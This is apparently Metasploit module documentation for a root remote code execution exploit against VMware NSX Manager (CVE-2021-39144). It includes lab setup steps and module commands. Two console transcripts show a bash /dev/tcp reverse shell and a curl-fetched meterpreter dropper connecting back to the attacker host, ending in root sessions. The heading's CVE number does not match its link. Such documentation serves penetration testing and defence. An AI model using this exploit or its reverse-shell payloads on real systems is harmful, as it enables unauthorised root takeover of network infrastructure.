## Vulnerable Application

VMware Cloud Foundation contains a remote code execution vulnerability via XStream open source library [CVE-2022-39144](https://nvd.nist.gov/vuln/detail/CVE-2021-39144).
VMware has evaluated the severity of this issue to be in the [Critical severity range](https://www.vmware.com/support/policies/security_response.html) with a maximum CVSSv3 base score of [9.8](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V),
a malicious actor can get remote code execution in the context of `root` on the appliance.

VMware Cloud Foundation `3.x` and more specific NSX Manager Data Center for vSphere up to and including version `6.4.13`
are vulnerable to Remote Command Injection.

This module has been tested against VMware NSX Manager (NSX-V) with the specifications listed below:

* VMware NSX Manager
* Version `6.4.13`
* Version `6.4.4`

## Verification Steps

Follow these instructions to install a vulnerable VMware NSX Manager on VirtualBox.
* Go to [Download VMware NSX for vSphere 6.4.13](https://customerconnect.vmware.com/en/downloads/details?downloadGroup=NSXV_6413&productId=417&rPId=96480)
* Note: You need to be a customer with valid VMware subscriptions
* Download the ova file `VMware-NSX-Manager-6.4.13-19307994.ova`
* Open VirtualBox and import the ova file
* After successful import, start the VM and you have a VMware NSX Manager running which is accessible using url `https://<nsx-manager-ip>`
* Credentials to login: user: `admin`, password: `default`
* Use the module and options below to test the vulnerability...

1. `use use exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144`
1. `set RHOSTS <TARGET HOSTS>`
1. `set RPORT <port>`
1. `set LHOST <attacker host ip>`
1. `set LPORT <attacker host port>`
1. `set TARGET <0-Unix command or 1-Linux Dropper>`
1. `exploit`
1. You should get a `bash` shell or `meterpreter` session depending on the target and payload settings.

## Options
No specific options.

## Scenarios

### VMware NSX Manager bash reverse shell

```
msf6 > use exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > options

Module options (exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machi
                                       ne or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)


msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > set rhosts 192.168.100.5
rhosts => 192.168.100.5
msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > set lhost 192.168.100.7
lhost => 192.168.100.7
msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > exploit

[*] Started reverse TCP handler on 192.168.100.7:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.100.5:443 can be exploited !
[+] The target appears to be vulnerable. Target is running VMware NSX Manager (NSX-V)
[*] Executing Unix (In-Memory) with bash -c '0<&44-;exec 44<>/dev/tcp/192.168.100.7/4444;sh <&44 >&44 2>&44'
[*] Command shell session 14 opened (192.168.100.7:4444 -> 192.168.100.5:42512) at 2022-11-05 10:33:37 +0000

pwd
/usr/lib/tanuki/bin
whoami
root
exit
[*] 192.168.100.5 - Command shell session 14 closed.

```

### VMware NSX Manager meterpreter session

```
msf6 > use exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > options

Module options (exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machi
                                       ne or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > set rhosts 192.168.100.5
rhosts => 192.168.100.5
msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > set lhost 192.168.100.7
lhost => 192.168.100.7
msf6 exploit(linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144) > exploit

[*] Started reverse TCP handler on 192.168.100.7:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.100.5:443 can be exploited !
[+] The target appears to be vulnerable. Target is running VMware NSX Manager (NSX-V)
[*] Executing Linux Dropper
[*] Using URL: http://192.168.100.7:8080/G5xrKmpiufcQdCt
[*] Client 192.168.100.5 (curl/7.81.0) requested /G5xrKmpiufcQdCt
[*] Sending payload to 192.168.100.5 (curl/7.81.0)
[*] Command Stager progress - 100.00% done (121/121 bytes)
[*] Sending stage (3045348 bytes) to 192.168.100.5
[*] Meterpreter session 13 opened (192.168.100.7:4444 -> 192.168.100.5:42384) at 2022-11-05 10:29:30 +0000
[*] Server stopped.

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.100.5
OS           : NSX Manager 6.4.13 (Linux 4.9.297)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

## Limitations
The vulnerability check is limited in detecting that VMWare NSX Manager (NSX-V) is running without obtaining the version information.
However all VMware NSX Manager versions up to `6.4.13` are vulnerable, except for `6.4.14`, so most detected targets are likely
to be vulnerable.
